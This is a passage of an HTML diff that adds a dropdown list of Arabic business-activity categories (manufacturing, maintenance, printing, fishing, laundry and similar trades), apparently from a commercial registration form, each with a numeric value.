+                <div class="activity-option" data-value="150">صنع العجائن المحشوة المطبوخة أو غير المطبوخة</div>
+                <div class="activity-option" data-value="149">صنع العجائن المحشوة المعبأة في علب أو المجمدة</div>
+                <div class="activity-option" data-value="156">صنع العسل الأسود (الدبس) وعسل السكر</div>
+                <div class="activity-option" data-value="197">صنع العلامات التجارية، حاشية الزخرفة والأصناف المماثلة من المواد النسيجية</div>
+                <div class="activity-option" data-value="144">صنع العلك (اللبان)</div>
+                <div class="activity-option" data-value="248">صنع العوارض ودعائم الأسقف والسقالات الخشبية والأصناف الخشبية المستخدمة في البناء والتشييد كالجملونات الخشبية سابقة التجهيز بالغراء أو الموصولة بالمعادن</div>
+                <div class="activity-option" data-value="451">صنع العوازل الكهربائية من الخزف أو الصيني المستخدمة في الآلات والماكينات والأجهزة الكهربائية</div>
+                <div class="activity-option" data-value="324">صنع الغازات الصناعية والهواء المسال أو المضغوط، الاستيلين، غازات التبريد، الغازات الصناعية المخلوطة، والغازات الخاملة والغازات العازلة</div>
+                <div class="activity-option" data-value="330">صنع الغازات المسيلة أو المضغوطة</div>
+                <div class="activity-option" data-value="332">صنع الفحم</div>
+                <div class="activity-option" data-value="131">صنع الفطائر بأنواعها</div>
+                <div class="activity-option" data-value="389">صنع القطن الطبي ومشتقاته</div>
+                <div class="activity-option" data-value="326">صنع القلويات والأملاح والمذيبات وغير ذلك من المركبات العضوية بما فيها الصودا الكاوية</div>
+                <div class="activity-option" data-value="147">صنع الكاكاو على شكل عجينه أو ألواح أو مسحوق أو زبدة أو دهن أو زيت الكاكاو</div>
+                <div class="activity-option" data-value="323">صنع الكيماويات العضوية الأساسية (المنتجات البتروكيميائية)</div>
+                <div class="activity-option" data-value="535">صنع اللافتات المعدنية ولوحات السيارات</div>
+                <div class="activity-option" data-value="252">صنع المباني الخشبية سابقة التجهيز</div>
+                <div class="activity-option" data-value="495">صنع المباني سابقة الصنع المكونة بصفة رئيسية من المعدن</div>
+                <div class="activity-option" data-value="346">صنع المبيدات الزراعية ومبيدات الفطريات</div>
+                <div class="activity-option" data-value="138">صنع المتاي</div>
+                <div class="activity-option" data-value="369">صنع المتفجرات والمنتجات النارية (مشعلات اللهب) وصمامات التفجير والألعاب النارية</div>
+                <div class="activity-option" data-value="118">صنع المثلجات (الآيس كريم)</div>
+                <div class="activity-option" data-value="584">صنع المجاهر البصرية بما فيها المعدة للتصوير المجهري وعرض الصور المصغرة وشاشات العرض</div>
+                <div class="activity-option" data-value="623">صنع المحركات الترددية أو الدوارة ومحركات الاحتراق الداخلي (عدا محركات معدات النقل)</div>
+                <div class="activity-option" data-value="589">صنع المحركات والمولدات الكهربائية متعددة الأغراض</div>
+                <div class="activity-option" data-value="99">صنع المخللات والطرشي (التخليل)</div>
+                <div class="activity-option" data-value="355">صنع المذيبات والمخففات المركبة العضوية وصنع محضرات إزالة الدهانات أو الورنيش</div>
+                <div class="activity-option" data-value="98">صنع المربى والمرملاد وهلامات المائدة (الجيلي)</div>
+                <div class="activity-option" data-value="753">صنع المركبات الفضائية</div>
+                <div class="activity-option" data-value="595">صنع المركمات الحمضية من الرصاص، النيكل ... إلخ</div>
+                <div class="activity-option" data-value="384">صنع المستحضرات الصيدلانية للاستخدام البشري</div>
+                <div class="activity-option" data-value="385">صنع المستحضرات الصيدلانية للاستخدام البيطري</div>
+                <div class="activity-option" data-value="361">صنع المستحضرات العطرية للاستخدام الشخصي مثل: العطورات أو ماء الكولونيا أو التواليت</div>
+                <div class="activity-option" data-value="747">صنع المسيرات البحرية وملحقاتها</div>
+                <div class="activity-option" data-value="166">صنع المشروبات الغازية المرطبة</div>
+                <div class="activity-option" data-value="167">صنع المشروبات المنكهة بخلاصات أو أرواح الفاكهة</div>
+                <div class="activity-option" data-value="603">صنع المصابيح (المنزلية والمائدة والجيب ....الخ)</div>
+                <div class="activity-option" data-value="348">صنع المطهرات (للاستخدامات الزراعية والاستخدامات الأخرى)</div>
+                <div class="activity-option" data-value="503">صنع المعدات الإضافية المستخدمة مع المراجل مثل موفرات الطاقة وأجهزة جمع البخار والكشط ... إلخ</div>
+                <div class="activity-option" data-value="148">صنع المعكرونة بأنواعها</div>
+                <div class="activity-option" data-value="436">صنع المعوجات وكواتم الصوت والمداخن والأنابيب والمواسير ... إلخ</div>
+                <div class="activity-option" data-value="608">صنع المكانس والدفايات والسخانات الكهربائية، الأجهزة الكهربائية لتلميع الأرضيات ... إلخ</div>
+                <div class="activity-option" data-value="222">صنع الملابس الخارجية (بلوفرات، بلوزات، سترات ... إلخ) من التريكو، المسنرة من الخيوط</div>
+                <div class="activity-option" data-value="221">صنع الملابس الداخلية المحبوكة والكروشية</div>
+                <div class="activity-option" data-value="205">صنع الملابس الرجالية وملابس الاولاد الجاهزة (ملابس داخلية، ملابس خارجية ... إلخ)</div>
+                <div class="activity-option" data-value="206">صنع الملابس النسائية والبناتية الجاهزة (ملابس داخلية، ملابس خارجية ... إلخ)</div>
+                <div class="activity-option" data-value="513">صنع المناشير والسكاكين ونصال القطع اللازمة للماكينات والأجهزة الميكانيكية</div>
+                <div class="activity-option" data-value="817">صنع المنتجات الحرفية المشتقة من العظام</div>
+                <div class="activity-option" data-value="169">صنع المنتجات الحرفية بتقطير الزهور والاعشاب</div>
+                <div class="activity-option" data-value="816">صنع المنتجات الحرفية لادوات الصيد التقليدية</div>
+                <div class="activity-option" data-value="171">صنع المنتجات الحرفية لإنتاج ماء وزيت اللبان</div>
+                <div class="activity-option" data-value="367">صنع المنتجات الحرفية لمستحضرات التجميل والعطور</div>
+                <div class="activity-option" data-value="522">صنع المنتجات الحرفية من الألمنيوم</div>
+                <div class="activity-option" data-value="236">صنع المنتجات الحرفية من الجلد</div>
+                <div class="activity-option" data-value="465">صنع المنتجات الحرفية من الحجر والجبس</div>
+                <div class="activity-option" data-value="268">صنع المنتجات الحرفية من الخشب</div>
+                <div class="activity-option" data-value="267">صنع المنتجات الحرفية من السعف</div>
+                <div class="activity-option" data-value="450">صنع المنتجات الحرفية من الفخار والخزف</div>
+                <div class="activity-option" data-value="489">صنع المنتجات الحرفية من الفضة</div>
+                <div class="activity-option" data-value="521">صنع المنتجات الحرفية من النحاس والمعادن</div>
+                <div class="activity-option" data-value="204">صنع المنتجات الحرفية من النسيج القطني أو الصوف</div>
+                <div class="activity-option" data-value="435">صنع المنتجات الخزفية التي تتحمل الحرارة العالية المستخدمة في العمليات الميتالورجية</div>
+                <div class="activity-option" data-value="433">صنع المنتجات الخزفية العازلة للحرارة المنتجة من تشكيل المساحيق</div>
+                <div class="activity-option" data-value="135">صنع المنتجات الخفيفة مثل رقائق الذرة وكعك دقيق الذرة (التورتيلا)، غير معد بالخبز</div>
+                <div class="activity-option" data-value="374">صنع المنتجات الفوتوكيميائية مثل الشرائح الفوتوغرافية والأفلام والورق الحساس ... إلخ</div>
+                <div class="activity-option" data-value="493">صنع المنتجات المعدنية الإنشائية وأجزائها مثل الجسور، أبراج، أعمدة، عوارض ... إلخ</div>
+                <div class="activity-option" data-value="359">صنع المنظفات الصناعية، وملمعات ومعاجين الأحذية والخشب والأرضيات والزجاج والمعادن، أو الأثاث بكافة أشكالها، ومعاجين ومساحيق الجلي بما في ذلك الورق والحشو، وصنع المواد أو المستحضرات ذات الفعالية في الغسيل أو التنظيف</div>
+                <div class="activity-option" data-value="388">صنع المواد الكيميائية المستخدمة في صنع المستحضرات الصيدلانية مثل المضادات الحيوية، الأمصال، الفيتامينات، المنتجات الهرمونية الأخرى، حامض السالسيليك وحامض او-أسيتيلساليسيليك، سكر كيميائي نقي ... إلخ</div>
+                <div class="activity-option" data-value="354">صنع المواد اللاصقة أو مركبات الجلفطة أو المستحضرات غير الحرارية المماثلة المستخدمة في الحشو أو تسوية السطوح</div>
+                <div class="activity-option" data-value="665">صنع الموازين وموازين لوحات رقمية لمختلف الأغراض(عدا موازين المختبرات الحساسة)</div>
+                <div class="activity-option" data-value="545">صنع الموصلات والمفاتيح الإلكترونية</div>
+                <div class="activity-option" data-value="192">صنع الموكيت</div>
+                <div class="activity-option" data-value="329">صنع المياه المقطرة</div>
+                <div class="activity-option" data-value="126">صنع النشاء من الذرة أو الأرز أو الحبوب الأخرى أو البطاطا أو من النباتات الأخرى</div>
+                <div class="activity-option" data-value="798">صنع النظارات الطبية والشمسية، والعدسات حسب الوصفة الطبية والعدسات اللاصقة ونظارات الأمان</div>
+                <div class="activity-option" data-value="528">صنع النوابض (اليايات) عدا نوابض الساعات؛ الخزائن الحديدية والأبواب المصفحة لأغراض الحماية وأعمدة وكبائن الإنارة وإشارات المرور</div>
+                <div class="activity-option" data-value="245">صنع ألواح الخشب الحبيبي والألواح الليفية باستخدام مكابس الضغط</div>
+                <div class="activity-option" data-value="400">صنع ألواح وقضبان وصفائح وشرائح وأشكال خاصة، من المطاط</div>
+                <div class="activity-option" data-value="285">صنع الورق الصحي والمناديل ومناديل التنظيف والمناشف والفوط الصحية وفوط الأطفال والمائدة وحشوات امتصاص النزيف ... إلخ، والأنواع الأخرى من المنتجات الورقية ذات الاستخدام الشخصي</div>
+                <div class="activity-option" data-value="280">صنع الورق المقوى متعدد الطبقات (الكرتون) وصنع الورق المقوى المضغوط المستخدم في البناء والتشييد والأعمال الأخرى</div>
+                <div class="activity-option" data-value="275">صنع الورق والورق المقوى (الكرتون) المموج</div>
+                <div class="activity-option" data-value="351">صنع الورنيشات</div>
+                <div class="activity-option" data-value="587">صنع الوسائط المغناطيسية والبصرية</div>
+                <div class="activity-option" data-value="334">صنع اليوريا سلفات والفوسفات الطبيعي الخام وأملاح البوتاسيوم الطبيعية الخام (تشمل الأسمدة العضوية)</div>
+                <div class="activity-option" data-value="491">صنع أنابيب ومواسير وأشكال مجوفة ووصلات أنابيب أو مواسير ولوازمها من حديد الزهر؛ صنع أنابيب ومواسير غير ملحومة من الصلب بعملية السباكة بالطرد المركزي</div>
+                <div class="activity-option" data-value="552">صنع أنظمة التحذير أو الإنذار من السرقة والحريق</div>
+                <div class="activity-option" data-value="237">صنع أنواع الأحذية الرجالية والنسائية وأحذية الأطفال الجلدية</div>
+                <div class="activity-option" data-value="238">صنع أنواع الأحذية الرجالية والنسائية وأحذية الأطفال المصنوعة من المطاط أو اللدائن أو الخشب</div>
+                <div class="activity-option" data-value="812">صنع أنواع الأختام، أشرطة للآلات الكاتبة، أدوات ولوازم الفنانين التشكيليين</div>
+                <div class="activity-option" data-value="200">صنع أنواع التل والدانتلا وغيرها من الأقمشة الشبكية</div>
+                <div class="activity-option" data-value="201">صنع أنواع اللباد (مشرب أو مغطى)</div>
+                <div class="activity-option" data-value="313">صنع أنواع الوقود السائلة (البنزين، الكيروسين، الديزل، ... إلخ)</div>
+                <div class="activity-option" data-value="314">صنع أنواع الوقود الغازية (البروبان، الإيثان، البيوتان ... إلخ)</div>
+                <div class="activity-option" data-value="472">صنع أنواع من الإسفلت أو من مواد مماثلة مثل زفت قطران الفحم</div>
+                <div class="activity-option" data-value="787">صنع أوراق اللعب</div>
+                <div class="activity-option" data-value="279">صنع أوعية التغليف الأخرى (علب حفظ الملفات، أغلفة الاسطوانات ... إلخ)</div>
+                <div class="activity-option" data-value="500">صنع أوعية للغازات المسالة أو المضغوطة مثل أنابيب الغاز والأوعية المماثلة</div>
+                <div class="activity-option" data-value="276">صنع أوعية من الورق أو من الورق المقوى المموج للأغذية والمشروبات والأغراض الأخرى</div>
+                <div class="activity-option" data-value="164">صنع بدائل اللبن لرضاعة صغار الحيوانات</div>
+                <div class="activity-option" data-value="650">صنع بكرات وآلات رفع وروافع ترسيه ورافعات سيارات</div>
+                <div class="activity-option" data-value="439">صنع بلاط الحوائط والأرضيات (السيراميك والقيشاني)</div>
+                <div class="activity-option" data-value="261">صنع تماثيل وتحف صغيرة وأطر البراويز وصناديق مجوهرات وعلب تحف من الخشب ... إلخ</div>
+                <div class="activity-option" data-value="537">صنع تمديدات مجاري التكييف المعدنية</div>
+                <div class="activity-option" data-value="740">صنع جميع أنواع الفلاتر للسيارات</div>
+                <div class="activity-option" data-value="734">صنع حاويات لنقل البضائع (كونتيرات)</div>
+                <div class="activity-option" data-value="229">صنع حقائب الأمتعة والحقائب المدرسية من الجلود الطبيعية أو الصناعية</div>
+                <div class="activity-option" data-value="639">صنع حنفيات ومحابس وصمامات وما يماثلها من أجهزة للأنابيب وجدران المراجل والصهاريج</div>
+                <div class="activity-option" data-value="273">صنع خام الورق الذي تصنع منه الفوط والمناديل وورق الوجه ونحو ذلك، وصنع ورق اللف والتغليف</div>
+                <div class="activity-option" data-value="134">صنع خبز الأكلات الشعبية ورقائق المعجنات النيئة</div>
+                <div class="activity-option" data-value="656">صنع خراطيش الأحبار</div>
+                <div class="activity-option" data-value="733">صنع خزانات خاصة لنقل السوائل</div>
+                <div class="activity-option" data-value="157">صنع خلاصات ومكسبات الطعم للمواد الغذائية والمشروبات (ماء الورد، الفانيليا ... إلخ)</div>
+                <div class="activity-option" data-value="622">صنع خلايا توليد الطاقة البديلة</div>
+                <div class="activity-option" data-value="202">صنع خيوط معدنية أو نسيجية وصنع أقمشة مشربه أو مغطاة أو مطلية بمطاط أو لدائن وما شابهها</div>
+                <div class="activity-option" data-value="102">صنع رقائق البطاطس</div>
+                <div class="activity-option" data-value="428">صنع زجاج الأمان بما فيها زجاج السيارات، زجاج الأوعية الحافظة للحرارة والبرودة، تقطيع وشطف الزجاج وصنع المرايا</div>
+                <div class="activity-option" data-value="278">صنع زكائب وأكياس ورقية</div>
+                <div class="activity-option" data-value="316">صنع زيوت التشحيم</div>
+                <div class="activity-option" data-value="641">صنع سلاسل وصل (زردات) مفصلية</div>
+                <div class="activity-option" data-value="533">صنع شارات معدنية وعلامات رتب عسكرية من المعدن</div>
+                <div class="activity-option" data-value="196">صنع شباك الصيد والأقفاص البحرية والحواجز الواقية</div>
+                <div class="activity-option" data-value="496">صنع شبكات حديد التسليح الملحومة والحوائط المعزولة من المعدن</div>
+                <div class="activity-option" data-value="199">صنع شرائط من أقمشة منسوجة</div>
+                <div class="activity-option" data-value="318">صنع شمع البرافين والشموع الأخرى</div>
+                <div class="activity-option" data-value="480">صنع صفائح وألواح ولفائف شريطية وقضبان وأسياخ وزوايا وأسلاك ومقاطع بكافة أشكالها</div>
+                <div class="activity-option" data-value="97">صنع صلصة الطماطم</div>
+                <div class="activity-option" data-value="572">صنع عدادات الكهرباء أو الغاز أو المياه</div>
+                <div class="activity-option" data-value="575">صنع عدد اكتشاف ورصد الاشعاع</div>
+                <div class="activity-option" data-value="762">صنع عربات المطاعم الجمالية مثل عربات الحلوى وعربات الطعام</div>
+                <div class="activity-option" data-value="760">صنع عربات اليد ذات العجل المستخدمة في نقل الأمتعة</div>
+                <div class="activity-option" data-value="255">صنع علب التعبئة والصناديق والاسطوانات وأوعية الشحن الأخرى ومستلزمات التغليف المشابهة المصنوعة من الخشب</div>
+                <div class="activity-option" data-value="518">صنع علب القولبة والقوالب (باستثناء قوالب السبائك)</div>
+                <div class="activity-option" data-value="277">صنع علب كرتون، صناديق، شنط مطوية أو مفردة من الورق أو من الورق المقوى (غير مموج)</div>
+                <div class="activity-option" data-value="919">صنع غاز الاستصباح</div>
+                <div class="activity-option" data-value="203">صنع فتائل وخراطيم وأنابيب نسيجية مبطنه أو مقواة أو مزودة بمواد أخرى</div>
+                <div class="activity-option" data-value="750">صنع قاطرات (جرارات) وعربات السكك الحديدية</div>
+                <div class="activity-option" data-value="654">صنع قطع مخصصة لمعدات الرفع والمناولة مثل الخطافات والمجارف ... إلخ</div>
+                <div class="activity-option" data-value="624">صنع قطع وأجزاء للمحركات المذكورة مثل الصمامات</div>
+                <div class="activity-option" data-value="460">صنع قواطع وألواح وأطر ومباني جاهزة من الخرسانة سابقة الصنع</div>
+                <div class="activity-option" data-value="321">صنع قوالب الليغنيت</div>
+                <div class="activity-option" data-value="287">صنع قوالب وشرائح ورقائق الترشيح من عجينه الورق</div>
+                <div class="activity-option" data-value="320">صنع قوالب وقود الفحم القاسي</div>
+                <div class="activity-option" data-value="618">صنع كابلات الأجهزة وكابلات الامتداد (التوصيل) وغيرها من مجموعات الكابلات الكهربائية والأسلاك المعزولة والموصلات</div>
+                <div class="activity-option" data-value="596">صنع كابلات الألياف البصرية لنقل البيانات</div>
+                <div class="activity-option" data-value="597">صنع كابلات الألياف البصرية لنقل الصور نقلا مباشرا</div>
+                <div class="activity-option" data-value="524">صنع كابلات وشرائط معدنية من الحديد أو النحاس أو الألمنيوم أو النحاس</div>
+                <div class="activity-option" data-value="398">صنع كعوب ونعال الأحذية من المطاط والأجزاء المطاطية الأخرى من الأحذية</div>
+                <div class="activity-option" data-value="270">صنع لباب وعجائن الورق من لب الخشب والألياف الأخرى والنفايات</div>
+                <div class="activity-option" data-value="411">صنع لوازم صحية من اللدائن مثل: أحواض الغسيل والاستحمام والمراحيض ... إلخ</div>
+                <div class="activity-option" data-value="539">صنع لوازم ومعدات الإنارة</div>
+                <div class="activity-option" data-value="541">صنع لوحات الدوائر المطبوعة الخالية، وتحميل المكونات على لوحات الدوائر المطبوعة</div>
+                <div class="activity-option" data-value="591">صنع لوحات مفاتيح الكهرباء بما فيها لوحات التحكم العددية</div>
+                <div class="activity-option" data-value="662">صنع ماكينات الإملاء</div>
+                <div class="activity-option" data-value="347">صنع مبيدات الحشرات والقوارض المنزلية</div>
+                <div class="activity-option" data-value="634">صنع مجموعات الخراطيم والتركيبات الهيدروليكية والهوائية المطاطية</div>
+                <div class="activity-option" data-value="627">صنع مجموعات المولدات والتوربينات</div>
+                <div class="activity-option" data-value="588">صنع مجموعة مولدات التيار الكهربائي المتردد أو المستمر</div>
+                <div class="activity-option" data-value="774">صنع مجوهرات مقلدة</div>
+                <div class="activity-option" data-value="640">صنع محامل كرات ومحامل دلفينية (بما في ذلك الكرات والإبر والحلقات والاسطوانات المعدنية)</div>
+                <div class="activity-option" data-value="381">صنع محسنات الوقود</div>
+                <div class="activity-option" data-value="380">صنع محلول اليوريا</div>
+                <div class="activity-option" data-value="590">صنع محولات كهربائية دوارة</div>
+                <div class="activity-option" data-value="345">صنع مخاليط المطاط التركيبي والمطاط الطبيعي</div>
+                <div class="activity-option" data-value="499">صنع مراجل التدفئة المركزية والأجهزة المشعة للحرارة</div>
+                <div class="activity-option" data-value="502">صنع مراجل لتوليد بخار الماء أو غيره من أنواع بخار الماء</div>
+                <div class="activity-option" data-value="754">صنع مركبات القتال العسكرية</div>
+                <div class="activity-option" data-value="328">صنع مركبات غير عضوية أخرى</div>
+                <div class="activity-option" data-value="732">صنع مركبات مقطورة ونصف مقطورة بما فيها الكارافان والتي تجر بواسطة السيارات</div>
+                <div class="activity-option" data-value="363">صنع مستحضرات التجميل، ومستحضرات العناية باليدين والأرجل ... إلخ</div>
+                <div class="activity-option" data-value="362">صنع مستحضرات الحلاقة ومزيلات وفرد الشعر بكافة أشكالها والجليسرول الخام</div>
+                <div class="activity-option" data-value="360">صنع مستحضرات تعطير الغرف وإزالة الروائح ومزيلات الروائح وأملاح الاستحمام</div>
+                <div class="activity-option" data-value="364">صنع مستحضرات تنظيف الفم أو الأسنان بما فيها معاجين أو مساحيق تثبيت الأسنان الصناعية</div>
+                <div class="activity-option" data-value="780">صنع مستلزمات رياضة صيد الأسماك ومستلزمات أنواع الصيد الأخرى</div>
+                <div class="activity-option" data-value="523">صنع مشابك تثبيت معدنية مثل المسامير والدبابيس والصواميل والحلقات بأنواعها</div>
+                <div class="activity-option" data-value="165">صنع مشروبات الشعير غير الكحولية</div>
+                <div class="activity-option" data-value="602">صنع مصابيح السيارات</div>
+                <div class="activity-option" data-value="638">صنع مضخات الهواء أو تفريغ الهواء أو ضواغط الهواء أو الغازات الأخرى</div>
+                <div class="activity-option" data-value="637">صنع مضخات للسوائل آلية أو يدوية</div>
+                <div class="activity-option" data-value="813">صنع مظلات مطر وشماسي، عصي، مكانس وفراجين، قداحات، مماسح أرضيات، منافض غبار بما فيها الآلية</div>
+                <div class="activity-option" data-value="559">صنع معدات الاتصالات للأقمار الصناعية</div>
+                <div class="activity-option" data-value="805">صنع معدات السلامة الشخصية من اللدائن كالقفازات وسترات النجاة</div>
+                <div class="activity-option" data-value="674">صنع معدات تحلية ومعالجة المياه</div>
+                <div class="activity-option" data-value="636">صنع معدات نقل الحركة الهيدروليكية</div>
+                <div class="activity-option" data-value="666">صنع معدات وغرف التجميد والتبريد وملحقاتها للأغراض التجارية مثل ثلاجات وفريزارات العرض والبيع ومبردات المياه والسوائل في المنشآت</div>
+                <div class="activity-option" data-value="671">صنع معدات يدوية أو آلية خاصة برش السوائل والمساحيق (عدا المستخدمة في الزراعة)، وآلات صقل وتجليخ (عدا آلات تجليخ المعادن والزجاج)، وصنع حشايا ووصلات مؤلفة من مجموعة من المواد</div>
+                <div class="activity-option" data-value="745">صنع مقاعد السفن</div>
+                <div class="activity-option" data-value="741">صنع مقاعد السيارات</div>
+                <div class="activity-option" data-value="207">صنع ملابس الأطفال (ولادي، بناتي) الجاهزة (ملابس داخلية، ملابس خارجية ... إلخ)</div>
+                <div class="activity-option" data-value="801">صنع ملابس السلامة الواقية والمقاومة للحريق</div>
+                <div class="activity-option" data-value="186">صنع مناديل وفوط ومناشف الأطباق</div>
+                <div class="activity-option" data-value="583">صنع مناشير وعدسات ومرايا تؤلف عناصر بصرية ومرشحات ألوان ... إلخ</div>
+                <div class="activity-option" data-value="311">صنع منتجات أفران الكوك</div>
+                <div class="activity-option" data-value="468">صنع منتجات الأحجار مثل التماثيل واللوحات وأصناف الزينة وما شابهها</div>
+                <div class="activity-option" data-value="335">صنع منتجات الأسمدة الأزوتية (حامض النيتريك، حامض النيتريك الكبريتي، الأمونيا، كلوريد الأمونيوم، كربونات الأمونيوم، النيتريتات، نترات البوتاسيوم ... إلخ)</div>
+                <div class="activity-option" data-value="421">صنع منتجات الروتومولد</div>
+                <div class="activity-option" data-value="429">صنع منتجات الفايبرجلاس</div>
+                <div class="activity-option" data-value="78">صنع منتجات اللحوم (سجق، برجر، مرتديلا، دقيق، مسحوق، مجفف ... إلخ)</div>
+                <div class="activity-option" data-value="477">صنع منتجات أولية من الحديد على شكل حبيبات أو مساحيق أو كتل من الركائز أو المخلفات الحديدية</div>
+                <div class="activity-option" data-value="818">صنع منتجات باستخدام تقنية ثلاثية الابعاد</div>
+                <div class="activity-option" data-value="423">صنع منتجات بلاستيكية من النفايات الغير خطرة</div>
+                <div class="activity-option" data-value="413">صنع منتجات خاصة بالتعبئة والتغليف مثل العلب والصناديق والقوارير ... إلخ</div>
+                <div class="activity-option" data-value="254">صنع منتجات خشبية متنوعة (ورش نجارة)</div>
+                <div class="activity-option" data-value="399">صنع منتجات مطاطية تامة أو غير تامة الصنع</div>
+                <div class="activity-option" data-value="505">صنع منتجات معدنية تامة وشبه تامة الصنع بالطرق، أو الكبس، أو السبك والدلفنة</div>
+                <div class="activity-option" data-value="479">صنع منتجات من الحديد أو من الصلب والفولاذ... إلخ، بواسطة السحب أو الطرق</div>
+                <div class="activity-option" data-value="410">صنع منتجات من اللدائن مثل: ألواح، شرائح، صفائح، أشرطة، مواسير وخراطيم ولوازمها ... إلخ</div>
+                <div class="activity-option" data-value="386">صنع منتجات نباتية مطحونة أو مصنعة أو محضرة</div>
+                <div class="activity-option" data-value="286">صنع منتجات ورقية للأغراض المنزلية مثل الأطباق والأكواب والصواني ... إلخ</div>
+                <div class="activity-option" data-value="437">صنع مواد البناء الخزفية الحرارية</div>
+                <div class="activity-option" data-value="463">صنع مواد البناء المنتجة من مواد نباتية والمكتلة بواسطة الأسمنت أو الجبس أو بمادة رابطة من المعدن</div>
+                <div class="activity-option" data-value="471">صنع مواد العزل المعدنية للصوت والحرارة من الصوف الحديدي أو من الصوف الصخري ... إلخ</div>
+                <div class="activity-option" data-value="379">صنع مواد كيميائية مساعدة للبلل والنفاذ ومنتجات كيمائية للاستخدام الصناعي ... إلخ</div>
+                <div class="activity-option" data-value="319">صنع مواد ولوازم العزل من المواد النفطية والكيميائية</div>
+                <div class="activity-option" data-value="422">صنع مواد ولوازم العزل ومنع التسرب للصوت والحرارة من اللدائن</div>
+                <div class="activity-option" data-value="646">صنع مواقد آلية وأجزائها مثل مواقد مفرغات الرماد وما يماثلها</div>
+                <div class="activity-option" data-value="645">صنع مواقد تعمل بالوقود السائل أو الغازي أو الصلب (أفران طهي غير كهربائية)</div>
+                <div class="activity-option" data-value="635">صنع نظم طاقة الموائع</div>
+                <div class="activity-option" data-value="804">صنع نماذج الكرة الأرضية</div>
+                <div class="activity-option" data-value="786">صنع نماذج مصغرة وغيرها من نماذج التسلية، ألعاب تركيبية من جميع الأنواع</div>
+                <div class="activity-option" data-value="677">صنع وتجميع آلات ومعدات ميكانيكية زراعية مثل : جرارات (تراكتورات)، وحراثات ومقطورات ذاتية التحميل والتفريغ ومعدات مناولة زراعية وأجهزة ري محوري ... إلخ</div>
+                <div class="activity-option" data-value="577">صنع وتجميع الساعات بأنواعها بما فيها الساعات المصنوعة من المعادن الثمينة</div>
+                <div class="activity-option" data-value="728">صنع وتجميع جميع أنواع المركبات ذات المحركات لمختلف الاستخدامات</div>
+                <div class="activity-option" data-value="752">صنع وتجميع محركات الطائرات وأجزائها</div>
+                <div class="activity-option" data-value="729">صنع وتجميع هياكل العربات ذات المحركات</div>
+                <div class="activity-option" data-value="366">صنع وتجهيز البخور</div>
+                <div class="activity-option" data-value="494">صنع وتركيب الإنشاءات الفولاذية سابقة الصنع لوحدات المصافي والتكرير والمنشآت الصناعية</div>
+                <div class="activity-option" data-value="214">صنع وتفصيل الكمة العمانية</div>
+                <div class="activity-option" data-value="213">صنع وتفصيل ملابس الرجال والنساء والأطفال الأخرى</div>
+                <div class="activity-option" data-value="151">صنع وجبات وأطباق جاهزة</div>
+                <div class="activity-option" data-value="288">صنع ورق الزينة والورق الصناعي وورق الجدران والتفصيل ... إلخ</div>
+                <div class="activity-option" data-value="272">صنع ورق الصحف وغيره من أنواع الطباعة أو الكتابة</div>
+                <div class="activity-option" data-value="290">صنع ورق الكتابة والرسم والطباعة والورق الشفاف والمصقول والورق المصمغ أو اللاصق الجاهز للاستعمال والأنواع الأخرى</div>
+                <div class="activity-option" data-value="486">صهر ودرفلة وسحب وتنقية المعادن غير الحديدية الخام (عدا المعادن الثمينة) مثل النحاس، الرصاص، الزنك الكروم، القصدير، الألمنيوم ... إلخ وخلائط هذه المعادن</div>
+                <div class="activity-option" data-value="869">صيانة السفن والمنشآت العائمة</div>
+                <div class="activity-option" data-value="1427">صيانة الشبكات</div>
+                <div class="activity-option" data-value="876">صيانة القوارب والوحدات البحرية</div>
+                <div class="activity-option" data-value="879">صيانة المسيرات البحرية وملحقاتها</div>
+                <div class="activity-option" data-value="1434">صيانة برمجيات وتصميم صفحات المواقع</div>
+                <div class="activity-option" data-value="859">صيانة مجموعة مولدات ومحركات ومحولات الطاقة الكهربائية (عدا مولدات الضغط العالي)</div>
+                <div class="activity-option" data-value="833">صيانة معدات المصانع</div>
+                <div class="activity-option" data-value="676">صيانة وتعبئة طفايات الحريق</div>
+                <div class="activity-option" data-value="43">صيد أسماك المياه العذبة</div>
+                <div class="activity-option" data-value="42">صيد الأسماك البحرية</div>
+                <div class="activity-option" data-value="1460">ضمان تعزيز خطابات الاعتماد وتسهيلات تمويل رأس المال العامل</div>
+                <div class="activity-option" data-value="295">طباعة الإعلانات والملصقات والتقاويم الزمنية والكروت الشخصية وبطاقات الأفراح وأوراق اللعب ... إلخ</div>
+                <div class="activity-option" data-value="289">طباعة الألبومات الخاصة بالصور والدفاتر التجارية وما إلى ذلك من النماذج التجارية المصورة</div>
+                <div class="activity-option" data-value="292">طباعة الصحف والمجلات والدوريات والمجلات المتخصصة</div>
+                <div class="activity-option" data-value="293">طباعة الكتب والكتب المدرسية والكراسات والكتيبات الموسيقية</div>
+                <div class="activity-option" data-value="123">طحن الخضراوات البقولية المجففة والجوزيات المعدة للأكل وتعبئتها</div>
+                <div class="activity-option" data-value="127">طحن الذرة المنداه</div>
+                <div class="activity-option" data-value="121">طحن وتعبئة الأرز وتبييضه</div>
+                <div class="activity-option" data-value="159">طحن وتعبئة البهارات والتوابل</div>
+                <div class="activity-option" data-value="120">طحن وتعبئة الحبوب (قمح، ذرة، شعير ... إلخ)</div>
+                <div class="activity-option" data-value="1488">عمليات إعادة التأمين</div>
+                <div class="activity-option" data-value="274">عمليات التجهيز الأخرى للورق والورق المقوى لإنتاج الورق المشرب والمطلي والمجعد ... إلخ</div>
+                <div class="activity-option" data-value="1758">عيادات طب الأسنان</div>
+                <div class="activity-option" data-value="1627">عيادة بيطرية</div>
+                <div class="activity-option" data-value="174">غزل وتحضير الخيوط الصناعية كالنايلون والديلون</div>
+                <div class="activity-option" data-value="173">غزل وتحضير القطن أو الصوف</div>
+                <div class="activity-option" data-value="176">غزل ونسج الألياف النباتية كالقنب والتيل</div>
+                <div class="activity-option" data-value="1822">غسيل الملابس وكيها بالبخار (الغسيل الجاف)</div>
+                <div class="activity-option" data-value="1819">غسيل جميع أنواع الملابس والمنسوجات</div>
+                <div class="activity-option" data-value="59">غسيل وتنظيف الرمل</div>
+                <div class="activity-option" data-value="1021">فحص المركبات بالكمبيوتر</div>
+                <div class="activity-option" data-value="1024">فحص المركبات وتدقيق الطرق الداخلية</div>
+                <div class="activity-option" data-value="894">فحص وصيانة أنظمة ومعدات السلامة ومكافحة الحرائق على السفن</div>
+                <div class="activity-option" data-value="1551">فحص ومعايرة الاجهزة والمعدات والمواد تامة الصنع</div>
+                <div class="activity-option" data-value="1793">قاعات وصالات الأفراح</div>
+                <div class="activity-option" data-value="1825">قص وتصفيف الشعر والحلاقة للأطفال</div>
